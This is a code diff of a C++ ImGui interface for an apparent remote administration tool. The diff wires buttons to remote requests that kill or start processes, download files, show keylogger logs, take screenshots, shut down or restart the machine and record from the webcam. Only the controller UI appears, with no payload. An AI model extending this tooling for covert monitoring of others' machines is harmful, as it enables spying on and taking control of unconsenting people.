@@ -2,6 +2,7 @@
 
 #include "imgui.h"
 #include "imgui_internal.h"
+#include "Utils.hpp"
 
 void SubMenu::Render(float DT) {
     if (ImGui::BeginTabItem(m_Name.c_str(), nullptr, ImGuiTabItemFlags_None)) {
@@ -27,7 +28,7 @@ void ProcessSubMenu::RenderLeft(float DT) {
     if (!anySelect)
         ImGui::BeginDisabled();
     if (ImGui::Button("Stop Process", ImVec2(-1, 44))) {
-        for (auto &pid : ProcessFeature::getSelectedProcesses()) {
+        for (auto &pid: ProcessFeature::getSelectedProcesses()) {
             m_processFeature.requestingFeature({0x02, sizeof(pid), reinterpret_cast<char *>(&pid)});
         }
     }
@@ -38,7 +39,7 @@ void ProcessSubMenu::RenderLeft(float DT) {
     }
     if (ImGui::BeginPopupModal("Start Process", nullptr, ImGuiWindowFlags_AlwaysAutoResize)) {
         static char processName[256] = {};
-        ImGui::InputText("Process Name", processName, sizeof(processName));
+        ImGui::InputText("File Path:", processName, sizeof(processName));
         if (ImGui::Button("Start")) {
             if (strlen(processName) > 0) {
                 m_processFeature.requestingFeature({0x03, static_cast<int>(strlen(processName)), processName});
@@ -58,15 +59,17 @@ void ProcessSubMenu::RenderLeft(float DT) {
 }
 
 void ProcessSubMenu::RenderRight(float DT) {
-    if (ImGui::BeginTable("ProcessTable1", 4, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY)) {
+    if (ImGui::BeginTable("ProcessTable1", 4,
+                          ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY)) {
         // ImGui::BeginChild("ProcessTableChild", ImVec2(-1, -1), true);
         ImGui::TableSetupColumn("Name", ImGuiTableColumnFlags_WidthStretch);
         ImGui::TableSetupColumn("PID", ImGuiTableColumnFlags_WidthFixed, 100.0f);
         ImGui::TableSetupColumn("Memory Usage", ImGuiTableColumnFlags_WidthFixed, 100.0f);
         ImGui::TableSetupColumn("CPU Time", ImGuiTableColumnFlags_WidthFixed, 100.0f);
+        ImGui::TableSetupScrollFreeze(0, 1);
         ImGui::TableHeadersRow();
         std::unordered_map<DWORD, ProcessFeature::ProcessInfoNode *> processList = m_processFeature.getProcessList();
-        for (const auto &node : processList) {
+        for (const auto &node: processList) {
             node.second->DisplayNode(node.second);
         }
         // ImGui::EndChild();
@@ -80,22 +83,45 @@ FileSubMenu::FileSubMenu(char *IP): m_FileFeature(IP) {
 
 void FileSubMenu::RenderLeft(float DT) {
     ImGui::BeginChild("ListFeatures", ImVec2(200, -1), true);
-    ImGui::BeginDisabled();
-    ImGui::Button("Open/Download", ImVec2(-1, 44));
-    ImGui::EndDisabled();
+    if (ImGui::Button("Load Directory", ImVec2(-1, 44))) {
+        m_FileFeature.requestingFeature({0x01, 0, nullptr});
+    }
+    if (!m_FileFeature.isFileSelected()) {
+        ImGui::BeginDisabled();
+        ImGui::Button("Open/Download File", ImVec2(-1, 44));
+        ImGui::EndDisabled();
+    } else if (m_FileFeature.getSelectedFiles()->isDirectory) {
+        if (ImGui::Button("Open Directory", ImVec2(-1, 44))) {
+            if (m_FileFeature.getCurrentFileName() == "..")
+                m_FileFeature.currentDirectory = m_FileFeature.currentDirectory.parent_path();
+            else
+                m_FileFeature.currentDirectory /= m_FileFeature.getSelectedFiles()->name;
+            m_FileFeature.requestingFeature({0x01, 0, nullptr});
+        }
+    } else {
+        if (ImGui::Button("Download File", ImVec2(-1, 44))) {
+            m_FileFeature.openSaveAsDialog(m_FileFeature.getCurrentFileName());
+            if (!m_FileFeature.getSaveFilePath().empty())
+                m_FileFeature.requestingFeature({0x00, 0, nullptr});
+        }
+    }
     ImGui::EndChild();
 }
 
 void FileSubMenu::RenderRight(float DT) {
-    // ImGui::BeginChild("FileTableChild", ImVec2(-1, -1), true);
+    ImGui::BeginChild("FileTableChild", ImVec2(-1, -1), true);
+    ImGui::Text("Current Directory: %s", m_FileFeature.getCurrentDirectory().c_str());
+    ImGui::Separator();
     if (ImGui::BeginTable("FileTable", 3, ImGuiTableFlags_Borders | ImGuiTableFlags_RowBg | ImGuiTableFlags_ScrollY)) {
         ImGui::TableSetupColumn("File Name", ImGuiTableColumnFlags_WidthStretch);
         ImGui::TableSetupColumn("File Size", ImGuiTableColumnFlags_WidthFixed, 100.0f);
-        ImGui::TableSetupColumn("Last Modified", ImGuiTableColumnFlags_WidthFixed, 150.0f);
+        ImGui::TableSetupColumn("Type", ImGuiTableColumnFlags_WidthFixed, 150.0f);
+        ImGui::TableSetupScrollFreeze(0, 1);
         ImGui::TableHeadersRow();
+        m_FileFeature.LoadFileList();
         ImGui::EndTable();
     }
-    // ImGui::EndChild();
+    ImGui::EndChild();
 }
 
 KeylogSubMenu::KeylogSubMenu(char *IP): m_KeyloggerFeature(IP) {
@@ -121,26 +147,43 @@ void KeylogSubMenu::RenderRight(float DT) {
     ImGui::TextWrapped(m_KeyloggerFeature.getLogging().c_str());
     ImGui::EndChild();
 }
+
 WinUtilsSubMenu::WinUtilsSubMenu(char *IP): m_WindowFeature(IP) {
     m_Name = "Windows Utilities";
 }
 
 void WinUtilsSubMenu::RenderLeft(float DT) {
     ImGui::BeginChild("WinUtilsFeatures", ImVec2(200, -1), true);
-    ImGui::Button("Take Screenshot", ImVec2(-1, 44));
-    ImGui::BeginDisabled();
-    ImGui::Button("Download Screenshot", ImVec2(-1, 44));
-    ImGui::EndDisabled();
-    ImGui::Button("Shutdown", ImVec2(-1, 44));
-    ImGui::Button("Restart", ImVec2(-1, 44));
-    ImGui::Button("Volumn Up (+)", ImVec2(-1, 44));
-    ImGui::Button("Volumn Up (-)", ImVec2(-1, 44));
+    if (ImGui::Button("Take Screenshot", ImVec2(-1, 44))) {
+        m_WindowFeature.requestingFeature({0x00, 0, nullptr});
+    }
+    if (!m_WindowFeature.isScreenshotAvailable())
+        ImGui::BeginDisabled();
+    if (ImGui::Button("Download Screenshot", ImVec2(-1, 44))) {
+        m_WindowFeature.openSaveAsDialog();
+    }
+    if (!m_WindowFeature.isScreenshotAvailable())
+        ImGui::EndDisabled();
+    if (ImGui::Button("Shutdown", ImVec2(-1, 44)))
+        m_WindowFeature.requestingFeature({0x03, 0, nullptr});
+
+    if (ImGui::Button("Restart", ImVec2(-1, 44)))
+        m_WindowFeature.requestingFeature({0x04, 0, nullptr});
+
+    if (ImGui::Button("Volumn Up (+)", ImVec2(-1, 44)))
+        m_WindowFeature.requestingFeature({0x01, 0, nullptr});
+    if (ImGui::Button("Volumn Up (-)", ImVec2(-1, 44)))
+        m_WindowFeature.requestingFeature({0x02, 0, nullptr});
     ImGui::EndChild();
 }
 
 void WinUtilsSubMenu::RenderRight(float DT) {
     ImGui::BeginChild("WinUtilsOutput", ImVec2(-1, -1), true);
-    ImGui::TextWrapped("Windows Utilities are not implemented yet. Windows Utilities are not implemented yet. Windows Utilities are not implemented yet.");
+    if (m_WindowFeature.isScreenshotAvailable()) {
+        ImGui::Image((ImTextureID) (intptr_t) (m_WindowFeature.getTextID()), ImGui::GetContentRegionAvail());
+    } else {
+        ImGui::TextWrapped("No screenshot taken yet.");
+    }
     ImGui::EndChild();
 }
 
@@ -150,13 +193,30 @@ WebcamSubMenu::WebcamSubMenu(char *IP): m_VideoFeature(IP) {
 
 void WebcamSubMenu::RenderLeft(float DT) {
     ImGui::BeginChild("WebcamFeatures", ImVec2(200, -1), true);
-    ImGui::Button("Start Webcam", ImVec2(-1, 44));
-    ImGui::Button("Download Webcam", ImVec2(-1, 44));
+    if (!m_VideoFeature.isRunning) {
+        if (ImGui::Button("Start Webcam", ImVec2(-1, 44)))
+            m_VideoFeature.requestingFeature({0x01, 0, nullptr});
+    }
+    else {
+        if (ImGui::Button("Stop Webcam", ImVec2(-1, 44)))
+            m_VideoFeature.requestingFeature({0x02, 0, nullptr});
+    }
+    if (!m_VideoFeature.isVideoAvailable)
+        ImGui::BeginDisabled();
+    if (ImGui::Button("Download Webcam", ImVec2(-1, 44))) {
+        m_VideoFeature.openSaveAsDialog();
+    }
+    if (!m_VideoFeature.isVideoAvailable)
+        ImGui::EndDisabled();
     ImGui::EndChild();
 }
 
 void WebcamSubMenu::RenderRight(float DT) {
     ImGui::BeginChild("WebcamOutput", ImVec2(-1, -1), true);
-    ImGui::TextWrapped("Webcam is not implemented yet. Webcam is not implemented yet");
+    if (!m_VideoFeature.isVideoAvailable)
+        ImGui::TextWrapped("No video recorded yet.");
+    else {
+        ImGui::TextWrapped("Video recorded successfully. Click the button to download.");
+    }
     ImGui::EndChild();
 }
